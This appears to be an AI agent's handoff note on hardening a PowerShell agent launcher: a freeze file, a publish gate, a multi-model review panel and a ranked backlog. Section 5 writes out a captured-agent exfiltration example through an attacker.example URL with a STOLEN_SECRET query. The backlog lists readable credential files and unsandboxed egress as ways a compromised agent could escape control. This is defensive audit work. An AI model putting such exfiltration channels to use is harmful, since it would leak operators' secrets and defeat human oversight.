# Swan Ops — handoff v5 (post eight-seat plan review)

**Date:** 2026-08-22 · **Author:** vs-claude (Opus 5) · **Linear:** `SWA-191`
**Supersedes:** `SWAN-OPS-HANDOFF-V4-2026-08-21.md` — v4 is still on disk and is still the
**working document** (it carries the full backlog, the traps, the Slice 2 spec). **v5 is the
session record and the corrections layer.** Read v5 first, then v4 §§5–16.

**Status:** the tool **refuses every run**. Slices 0 and 1 shipped. Five rounds of hostile
review by eight models found 30+ defects, most of them in the *fixes* from the round before.
**Nothing is committed. Nothing deployed. The branch is untouched.**

---

## 1. If you read nothing else

1. **The tool is fully frozen.** A `FREEZE` file in `swan-ops/` makes `.cmd`, the menu,
   `-Market` and `-Yes` all exit 4, before *any* code runs. Delete the file to lift it.
2. **`OPEN-1` is still open** — unsandboxed egress, unscrubbed child env. It is the only
   control that would constrain a captured agent, and it is untouched.
3. **The invest-or-freeze decision (`SWA-191`) is unanswered.** Recommendation on record:
   **retire-in-place**, with a default — *absent an answer, treat it as retired, not blocked.*
   **Do not drift into Slice 2 for want of a decision.**
4. **The dry-loop is NOT dry.** Five rounds ran; round 5 still found three real defects, all
   fixed. **Zero consecutive clean rounds.** Do not write `DRY-LOOP: CLEAN×2` for this
   workstream — it has not been earned.
5. **A privacy issue needs Sean, not an agent:** 59 documents in this repo contain the
   operator's Windows username, 140 occurrences, months old, several already shipped to
   external model vendors. See §4.

---

## 2. Verify the state in 60 seconds

```powershell
cd <repo-parent>\quick-pt\swan-ops
powershell -NoProfile -ExecutionPolicy Bypass -File tests\test-publish-gate.ps1    # 53/53
powershell -NoProfile -ExecutionPolicy Bypass -File tests\test-launcher-e2e.ps1   # 7/7
.\Swan-Ops.ps1 -Market "x"      # FREEZE present -> exit 4, nothing else runs
```

If either suite is not green, **stop** — something changed and nothing in this document is
trustworthy until you know what.

**File map, every number measured against disk 2026-08-22:**

```
FREEZE                     9   ⛔ presence refuses every run. Delete to lift.
Swan-Ops.ps1             285   orchestration only — 15 lines under its 300 cap
README.md                242   usage + enforced-constraints table + freeze
lib/Freeze.ps1            49   the freeze gate — runs FIRST, before preflight
lib/Preflight.ps1         33   codex presence + version drift (extracted 08-22)
lib/Console.ps1          165   palette, input hardening, link checker
lib/BrowserPolicy.ps1    142   ★ all browser decisions + the measurements behind them
lib/Publish.ps1          510   ★ THE PUBLISH GATE — read its header before touching it
lib/Handles.ps1           57   operator-supplied handle loader
jobs/market-recon.md     306   job-1 prompt + §5 verdict-block contract
tests/test-publish-gate.ps1  301   53 assertions, unit level
tests/test-launcher-e2e.ps1  194   7 assertions, REAL launcher + stubbed codex
sandbox/                       9.3 MB / 184 files, 812 JWT-shaped third-party strings
reports/                       2 reports — both predate the gate (see §6)
```

---

## 3. What this session actually changed

| Area | Change |
|---|---|
| **Freeze** | Was prose → then `-Yes` only → now **a `FREEZE` file refusing every entry point, checked before preflight**, one call site, mutation-proven. |
| **Publish gate** | `OPEN-11` closed: the launcher no longer fetches agent-authored URLs (see §5). |
| **Supply chain** | `@playwright/mcp` pinned `0.0.79`. `OPEN-2` **NARROWED, not closed** — transitive deps still float, no integrity hash, `codex` version-checked-not-pinned. |
| **Tests** | 18 → **53** unit, 5 → **7** e2e. Freeze covered and mutation-tested four ways. |
| **Structure** | `lib/Freeze.ps1` and `lib/Preflight.ps1` extracted; launcher 285 with real headroom. |
| **Plan** | §2 carries a recommendation again; §3's sandbox claim scoped to `OPEN-10`; §14 acceptance went from 1 criterion to **9**; Slice 2 barred from reusing `$AdLibraryOrigins`. |

---

## 4. ⚠ THE PRIVACY ITEM — needs Sean, not an agent

**Finding (Grok):** the review packet already dispatched to six external vendors contained the
operator's Windows username three times, inside filesystem paths.

**Then the real scope:** `grep -rlc '<the operator username>' docs/ai-workflow/AI-HANDOFF/*.md` →
**59 files, 140 occurrences**, dating to April. Many of those documents were *already sent* to
Kimi, GLM, HY3 and others in earlier review panels.

**How it got past the guard:** a `Grep` secret-scan run before dispatch returned
**"No matches found" on a file that demonstrably contained the string.** The instrument
produced a false negative and it was believed. This is the seventh instance of the
believe-an-unvalidated-negative class in this workstream and the first that caused an actual
privacy violation rather than a wrong claim.

**Done:** the two documents under this session's control were redacted to `<OPERATOR>`.
**Not done, and deliberately so:** the other 57. Rule 34 forbids bulk cleanup without explicit
approval, and rewriting 59 files touches other agents' work.

**Decision needed:** sweep the back-catalogue, leave it, or redact-on-egress only (a
redaction step inside the packet builders, which is the durable fix).

**The procedural lesson, which belongs in every future scan:** before trusting a scanner's
silence, **make it speak** — grep for a string you *know* is present. If it cannot find that,
its silence about anything else means nothing.

---

## 5. The finding nine prior rounds missed

**`Test-ReportLinks` exfiltrated on the agent's behalf, from the parent process.**

It HEAD-fetched every URL in the report — up to 40, **no allowlist** — from the **operator's**
PowerShell process, **after** publication (`Console.ps1` → called at `Publish.ps1:481`).

The attack: a captured agent writes `https://attacker.example/x?d=<data>` into its report. The
gate cannot stop it publishing — that is by design, the gate constrains negligence, not
capture. The operator's own machine then makes the request.

**Why it matters beyond itself: Slice 2 would not have closed it.** Slice 2 constrains the
codex *child*. This ran in the *parent*. A fully-green Slice 2 acceptance would have lifted
the freeze with this channel standing.

Found independently by **Grok and Sol**; confirmed by reading; **proven** with a local
listener — default call: **0 hits**; with `-CheckLiveness`: the listener received
`/exfil?d=STOLEN_SECRET`.

**Fixed:** liveness is opt-in, off by default. Syntactic checks (URL count, bare-`VERIFIED`
detection) still always run — that was where nearly all the value was. Side benefit: the
suite is now hermetic.

**Residual (GLM):** the opt-in path still has no allowlist and still permits
`http://localhost:PORT` SSRF. The natural operator instinct is to run liveness on the
*suspicious* report — the one most likely to carry attacker URLs. An allowlist enforced at the
fetch site is the obvious next step and was not taken.

---

## 6. Claims about this tool you should NOT repeat without checking

- **"The gate is proven."** It has **never processed a real report.** Both reports in
  `reports/` are dated 2026-08-14; the gate was born 2026-08-19. All 53+7 assertions are
  function-level plus a stubbed launcher. First attended run is the real end-to-end proof.
- **"Draft & stage only."** True of the browser (`--isolated`), false of the agent's shell.
- **"It cannot edit its own instructions."** Conditional on Windows `workspace-write` actually
  enforcing — `OPEN-10`, **unverified**. That single untested question now underwrites two
  separate safety claims, including the freeze file's "the agent cannot remove it."
- **"OPEN-2 is fixed."** NARROWED. Top-level pin only.
- **"The publish gate solves fabrication."** It stops *silent* publication of negligent,
  malformed, truncated or honestly-failed runs. A captured agent still writes
  `RUN_VERDICT: VALID` over a fabrication.

---

## 7. Open backlog, ranked

| # | Sev | Finding |
|---|---|---|
| **OPEN-1** | **CRITICAL** | Unsandboxed egress + unscrubbed child env. Sandbox restricts writes, **not reads** — `~/.ssh`, `~/.codex`, `.env` all readable. Only control that binds a captured agent. **Slice 2.** |
| **OPEN-2** | HIGH (narrowed) | Transitive deps still float; no integrity hash; `codex` checked-not-pinned. |
| **OPEN-3** | HIGH | `$AdLibraryOrigins` contains `https://www.google.com` while the disclosure claims two ad libraries. **Slice 2 must not reuse this list as its allowlist.** |
| **OPEN-10** | **RAISED** | Windows `workspace-write` strength unverified — now underwrites two safety claims. **One empirical test settles it. Do this early; it is cheap and load-bearing.** |
| **OPEN-11** | closed-with-residual | Parent-process fetch. Opt-in path still unallowlisted. |
| **OPEN-12** | MEDIUM | `swan-ops` is **not a git repo** — single copy on disk. Fix = `git init` **with `.gitignore` written first** (`sandbox/`, `logs/`, `.work/`), or the remediation becomes the incident. |
| OPEN-5, 7, 8, 9 | MED/LOW | Report-body overstatement · Google sub-pass undisciplined · no wall-clock timeout · 9.3 MB of JWT-bearing browser artifacts, unpruned. |

---

## 8. If Sean says "invest" — Slice 2, corrected

v4 §14 is the spec; it was rewritten this session from **1 acceptance criterion to 9** because
the original could pass while the hole stood (a PATH shim on `curl.exe` plus a hosts-file entry
would have satisfied it).

**Settle this first, empirically:** step 1 says "the recon job needs none of them" — but the
`codex` CLI itself needs model auth. Scrub everything and codex cannot start; keep its
credentials and `OPEN-1` is unmitigated for the exact secret that matters. **One `codex exec`
with a scrubbed env answers it.** An agent that skips this stalls in hour one or ships a scrub
that exempts what it was written to remove.

**Do not** reuse `$AdLibraryOrigins`. **Do not** accept a proxy as the mechanism — an env-var
proxy is prose one layer down; a captured agent ignores it. OS-level control or nothing.
**Add a parent-side criterion** — every one of the nine tests the child, and `OPEN-11` proved
the parent is also an egress path.

---

## 9. How this session worked, and what it cost

**Eight seats, five rounds, $1.35.**

| Seat | Cost | Unique decisive findings | False claims |
|---|---|---|---|
| **GLM-5.3** | **$0** | most — freeze extent, reorder mutation, no-VCS, gitignore trap, stale counts, pre-gate execution | 1 |
| **Grok-4.6** | $0.151 | 2 — the PII leak, the parent exfil | 1 |
| **DeepSeek-V4-Flash** | **$0.005** | 2 — stale comment, "pin codex too", menu-path gap | 0 |
| **Kimi-K3** | $0.192 | 1 — sharpest framing of the §3/OPEN-10 contradiction | 0 |
| **Sol-Pro** | $0.559 | 1 — corroborated the exfil independently | 0 |
| **DeepSeek-V4-Pro** | $0.124 | 0 unique | 0 |
| **Qwen-3.8** | $0 | 0 across five rounds | 1 |
| **Fable-5** | $0.316 | **failed — empty response** | — |

**The routing fact worth keeping: the free seat outperformed both expensive seats, and the
half-cent seat outperformed the fifty-six-cent one.** For adversarial review, free/near-free
should be the default and expensive the escalation.

**Fable's failure was our script's fault.** `consult-fable.mjs` read only `message.content`;
Anthropic models via OpenRouter can return a block array or put text in `reasoning`. One field
read turned a paid call into nothing with no diagnostic. Hardened (free) to try every shape and
dump the envelope on failure. **Not re-run** — expensive seats were capped at one run each.

**Panel artifacts:** `panel-swan-ops-plan-2026-08-22/` (round 1) and `r2/`–`r5/`.
**Synthesis:** `SWAN-OPS-PLAN-PANEL-SYNTHESIS-2026-08-22.md`.

---

## 10. Four reviewer findings that were WRONG

Verified false by execution. **Re-raising any of these is a finding against you.**

| Claim | Seat | Why it failed |
|---|---|---|
| §3 and OPEN-9 contradict on sandbox size | Grok | Both true — `.playwright-mcp/` *is* essentially the whole sandbox |
| "53 assertions is really 44" | Qwen | Counted case-table entries statically; runtime prints 53 |
| Desktop is OneDrive-backed, so JWT logs already left | GLM | Desktop is not redirected into OneDrive |
| `lib/Freeze.ps1` is brace-unbalanced and cannot parse | GLM | 3 open, 3 close; parses clean |

**Every reviewer claim was executed before it was acted on.** That discipline is what kept
four bad changes out of the tree.

---

## 11. The dry-loop ledger — read before claiming dryness

| Round | Vantage | Found |
|---|---|---|
| 1 | plan-vs-code, 8 seats | PII leak · parent exfil · freeze untested · §14 defeatable · no VCS · stale comment |
| 2 | attack round-1's fixes | freeze test proved no-publish not no-**spend** · entry-point gap · OPEN-2 over-claimed · gitignore trap · stale counts |
| 3 | attack round-2's fixes | test pinned a **disjunction** of two controls · §5 reasserted an unverified boundary · startup-only gate · "all five"/nine mismatch |
| 4 | attack round-3's fixes | menu re-check untested *(two seats convergent)* · line-count self-contradiction · asymmetric test isolation · **hand-abridged evidence** |
| 5 | attack round-4's fixes | quarantine assertion missing · **execution before the gate** · cap unresolved |

**Every round found defects in the previous round's fixes.** That is the documented pattern in
this repo's learning corpus, and it held five times in a row.

**Zero consecutive clean rounds. `DRY-LOOP: CLEAN×2` has not been earned.**

---

## 12. Traps that cost real time (v4 §8 has the full list — these are the new ones)

- **A mutation test proves your test catches the mutation you thought of.** I deleted a branch,
  watched the test fail, and called it proof. A *reorder* of the same branch would have spent
  money, published nothing, exited 4, printed the right word, and passed.
- **When two controls can satisfy one assertion, the test measures their OR.** Both freeze
  messages contained the word "freeze"; matching it pinned neither control.
- **Heredocs through bash mangle escapes** — twice more this session, once writing a literal
  carriage return into a PowerShell comment and breaking the parse. Write patches to a file.
- **Shaving comments to fit a line cap is not fixing it.** The launcher was trimmed four times
  in one session before the right move — extract a function — was taken.
- **Hand-retyped console output in a review packet is a fabrication surface**, even when the
  numbers are right. Paste verbatim.

---

## 13. First five minutes for the next agent

1. Read §1, §4, §6. Then v4 §§5, 7, 8, 14.
2. Run both suites (§2). Not green → stop.
3. Check `.ai-workflow/coordination/*.lane.md` — another agent works this tree.
4. **Ask Sean the `SWA-191` question if unanswered. Do not default into Slice 2.**
5. If you touch `lib/Publish.ps1`, read its header first — it carries eleven rounds of
   argument, and at least six "obvious improvements" have already been tried and shown to be
   defects.
6. **Run `OPEN-10`'s empirical test early.** It is one write attempt from inside a run, and it
   underwrites two separate safety claims that are currently assertions.
